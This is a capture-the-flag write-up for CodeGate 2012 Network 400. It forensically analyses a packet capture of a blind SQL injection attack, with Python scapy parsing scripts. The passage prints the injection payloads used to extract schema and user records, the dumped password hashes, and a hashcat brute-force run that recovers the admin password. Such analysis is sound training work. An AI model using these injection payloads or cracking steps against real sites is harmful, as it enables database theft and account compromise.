---
title: 'CodeGate 2012 Quals &#8211; Network 400'
author: pdah
layout: post

aktt_notify_twitter:
  - no
shorturls:
  - 'a:0:{}'
tweetbackscheck:
  - 1408358966
category: ctf - clgt crew
tags:
  - '2012'
  - codegate
  - network
---
**Challenge**

> Because of vulnerability of site in Company A, database which contains user&#8217;s information was leaked. The file is dumped packet at the moment of attacking.  
> Find the administrator&#8217;s account information which was leaked from the site.  
> For reference, some parts of the packet was blind to XXXX.
> 
> Answer : strupr(md5(database\_name|table\_name|decode(password\_of\_admin)))  
> (&#8216;|&#8217;is just a character) 

<http://repo.shell-storm.org/CTF/CodeGate-2012/Network400/80924D4296FCBE81EA5F09CF60542AE7>

**Summary**

Given a pcap file (again) captured from an attack, we need to find information about database name, table name, administrator’s password in plaintext.  
This challenge requires basic network analysis skill, some knowledge of Blind SQL Injection and password recovery tools.

**Solution**

Browsing the pcap file using wireshark, this is obviously a Blind SQL Injection attack.

<pre class="brush: plain; gutter: false; highlight: [1,15,19,33]; title: ; notranslate" title="">GET /sc/id_check.php?name=music%27%20AND%20%27Ohavy%27=%27Ohavyy HTTP/1.1
Accept-Encoding: identity
Accept-Language: en-us,en;q=0.5
Host: www.cdgate.xxx
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.15)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close

HTTP/1.1 200 OK
Date: Wed, 22 Feb 2012 09:01:54 GMT
Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.1 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g
X-Powered-By: PHP/5.2.6-2ubuntu4.1
Vary: Accept-Encoding
Content-Length: 0
Connection: close
Content-Type: text/html

GET /sc/id_check.php?name=music%27%20AND%20%27Ohavy%27=%27Ohavy HTTP/1.1
Accept-Encoding: identity
Accept-Language: en-us,en;q=0.5
Host: www.cdgate.xxx
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.15)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close

HTTP/1.1 200 OK
Date: Wed, 22 Feb 2012 09:01:54 GMT
Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.1 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g
X-Powered-By: PHP/5.2.6-2ubuntu4.1
Vary: Accept-Encoding
Content-Length: 4
Connection: close
Content-Type: text/html
</pre>

Some first requests are just for checking the responses of server to some random injected queries. We can easily notice that if the expressions in injected queries return False, HTTP response will have **“Content-Length: 0”**, otherwise the expressions return True. Another thing is that all the attacking queries had the same pattern of **… [EXPRESSION] > [VALUE] …** As the operators were all ‘>’, for each [EXPRESSION] we only need to catch the last [VALUE] of ‘False’ responses.

We created a python script to parse this pcap file:

<pre class="brush: python; title: ; notranslate" title="">import sys
from scapy.all import *
import urllib, string

packets = rdpcap("network400")
len_packets = len(packets)
l1 = []
l2 = []
i = 0
while i &lt; len_packets:
    if 'Raw' in packets[i] and packets[i].payload.dst == '192.168.1.41':
        l1.append(urllib.unquote(str(packets[i]['Raw']).split("r")[0]))
        while True:
            i+=1
            if 'Raw' in packets[i]:
                if packets[i].payload.dst == '192.168.1.8':
                    content = str(packets[i]['Raw'])
                    if 'Content-Length: 0' in content:
                        l2.append(False)
                    else:
                        l2.append(True)
                    break
    i+=1
for i in range(len(l1)):
    print l1[i]
    print l2[i]
</pre>

Here&#8217;s a part of the output:

> &#8230;  
> GET /sc/id\_check.php?name=music&#8217; AND CONNECTION\_ID()=CONNECTION_ID() AND &#8216;YOxWw&#8217;=&#8217;YOxWw HTTP/1.1  
> True  
> GET /sc/id_check.php?name=music&#8217; AND ISNULL(1/0) AND &#8216;wSwEm&#8217;=&#8217;wSwEm HTTP/1.1  
> True  
> GET /sc/id\_check.php?name=music&#8217; AND ORD(MID((SELECT 7 FROM information\_schema.TABLES LIMIT 0, 1), 1, 1)) > 51 AND &#8216;zqAWP&#8217;=&#8217;zqAWP HTTP/1.1  
> True  
> GET /sc/id\_check.php?name=music&#8217; AND ORD(MID((SELECT 7 FROM information\_schema.TABLES LIMIT 0, 1), 1, 1)) > 54 AND &#8216;zqAWP&#8217;=&#8217;zqAWP HTTP/1.1  
> True  
> GET /sc/id\_check.php?name=music&#8217; AND ORD(MID((SELECT 7 FROM information\_schema.TABLES LIMIT 0, 1), 1, 1)) > 56 AND &#8216;zqAWP&#8217;=&#8217;zqAWP HTTP/1.1  
> False  
> GET /sc/id\_check.php?name=music&#8217; AND ORD(MID((SELECT 7 FROM information\_schema.TABLES LIMIT 0, 1), 1, 1)) > 55 AND &#8216;zqAWP&#8217;=&#8217;zqAWP HTTP/1.1  
> False  
> GET /sc/id\_check.php?name=music&#8217; AND ORD(MID((SELECT 7 FROM information\_schema.TABLES LIMIT 0, 1), 2, 1)) > 51 AND &#8216;zqAWP&#8217;=&#8217;zqAWP HTTP/1.1  
> False  
> GET /sc/id\_check.php?name=music&#8217; AND ORD(MID((SELECT 7 FROM information\_schema.TABLES LIMIT 0, 1), 2, 1)) > 48 AND &#8216;zqAWP&#8217;=&#8217;zqAWP HTTP/1.1  
> False  
> GET /sc/id\_check.php?name=music&#8217; AND ORD(MID((SELECT 7 FROM information\_schema.TABLES LIMIT 0, 1), 2, 1)) > 1 AND &#8216;zqAWP&#8217;=&#8217;zqAWP HTTP/1.1  
> False  
> GET /sc/id\_check.php?name=music&#8217; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema\_name)) AS CHAR(10000)), CHAR(32)) FROM information_schema.SCHEMATA), 1, 1)) > 51 AND &#8216;yFdDA&#8217;=&#8217;yFdDA HTTP/1.1  
> False  
> GET /sc/id\_check.php?name=music&#8217; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema\_name)) AS CHAR(10000)), CHAR(32)) FROM information_schema.SCHEMATA), 1, 1)) > 48 AND &#8216;yFdDA&#8217;=&#8217;yFdDA HTTP/1.1  
> True  
> GET /sc/id\_check.php?name=music&#8217; AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema\_name)) AS CHAR(10000)), CHAR(32)) FROM information_schema.SCHEMATA), 1, 1)) > 49 AND &#8216;yFdDA&#8217;=&#8217;yFdDA HTTP/1.1  
> True  
> &#8230;

We extended the script to print out only the leaked characters

<pre class="brush: python; title: ; notranslate" title="">import sys
from scapy.all import *
import urllib
packets = rdpcap("network400")
len_packets = len(packets)

cur_s = None
last_false_value = None
result = ""
i=0
while i &lt; len_packets:
    if ('Raw' in packets[i]) and (packets[i].payload.dst == '192.168.1.41'):
        query = urllib.unquote(str(packets[i]['Raw']).split("r")[0])
        if "&gt;" in query:
            s,v = query.split("&gt;")
            v=chr(int(v.strip().split(" ")[0]))
            if cur_s != s and last_false_value != None:
                result+= last_false_value
            cur_s = s
        else:
            v = None
        while True:
            i+=1
            if 'Raw' in packets[i]:
                if packets[i].payload.dst == '192.168.1.8':
                    content = str(packets[i]['Raw'])
                    if 'Content-Length: 0' in content:
                        last_false_value = v
                    break

    i+=1
print result
</pre>

The output looks better (but lack of information about queries):

<pre class="brush: plain; gutter: false; highlight: [82,83,84,85,86,87]; title: ; notranslate" title="">2
information_schema
cdgate
17
CHARACTER_SETS
COLLATIONS
COLLATION_CHARACTER_SET_APPLICABILITY
COLUMNS
COLUMN_PRIVILEGES
KEY_COLUMN_USAGE
PROFILING
ROUTINES
SCHEMATA
SCHEMA_PRIVILEGES
STATISTICS
TABLES
TABLE_CONSTRAINTS
TABLE_PRIVILEGES
TRIGGERS
USER_PRIVILEGES
VIEWS
1
member
3
cdgate
6
name
id
email
sex
level
passwd
11
monitor@cdgate.xxx
08b5411f848a2581a41672a759c87380
2
monitor
*1763CA06A6BF4E96A671D674E855043A9C7886B2
f
apple@cdgate.xxx
apple
3
apple
*C5404E97FF933A91C48743E0C4063B2774F052DD
m
music@cdgate.xxx
music
6
music
*DBA29A581E9689455787B273C91D77F03D7FAD5B
m
computer@cdgate.xxx
computer
2
computer
*8E4ADF66627261AC0DE1733F55C7A0B72EC113FB
f
com@cdgate.xxx
com
3
com
*FDDA9468184E298A054803261A4753FF4657E889
f
lyco@cdgate.xxx
lynco
4
*EEFD19E63FA33259154630DE24A2B17772FAC630
*0ECBFBFE8116C7612A537E558FB7BE1293576B78
f
mouse@cdgate.xxx
mouse
4
*87A5750BB01F1E52060CF8EC90FB1344B1D413AA
*6FF638106693EF27772523B0D5C9BFAF4DD292F1
m
root@cdgate.xxx
root
6
root
*300102BEB9E4DABEB8BD60BB9BB6686A6272C787
f
desktop@cdgate.xxx
desktop
1
desktop
*DDD9B83818DB7B634C88AD49396F54BD0DE31677
f
www@cdgate.xxx
4eae35f1b35977a00ebd8086c259d4c9
8
www
*3E8563E916A490A13918AF7385B8FF865C221039
f
notebook@cdgate.xxx
notebook
8
fb5d1b4a2312e239652b13a24ed9a74f
*18DF7FA3EE218ACB28E69AF1D643091052A95887
m
</pre>

By combining outputs of these 2 scripts we could see that database is **cdgate** and table name is **member**. These information were followed by a number of member records, the value for each record were in order of email, id, level, name, password, sex. There was only one user desktop@cdgate.xxx with level=1, the password was hashed hence we let hashcat do the rest:

<pre class="brush: bash; gutter: false; title: ; notranslate" title="">$ echo DDD9B83818DB7B634C88AD49396F54BD0DE31677 &gt; hash
$ ./hashcat-cli64.bin -m300 -a3 --bf-cs-buf=abcdefghijklmnopqrstuvwxyz0123456789 hash outdir
................
Charset...: abcdefghijklmnopqrstuvwxyz0123456789
Length....: 6
Index.....: 0/1 (segment), 2176782336 (words), 0 (bytes)
Recovered.: 0/1 hashes, 0/1 salts
Speed/sec.: - plains, 13.99M words
Progress..: 1360425204/2176782336 (62.50%)
Running...: 00:00:01:37
Estimated.: 00:00:00:58
ddd9b83818db7b634c88ad49396f54bd0de31677:etagcd
All hashes have been recovered
</pre>

Bingo! The password is **etagcd**, it’s time to build the flag:

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">&gt;&gt;&gt; hashlib.md5('cdgate|member|etagcd').hexdigest().upper();
'AB6FCA7FFC88710CFBC37D5DF9A25F3F'
</pre>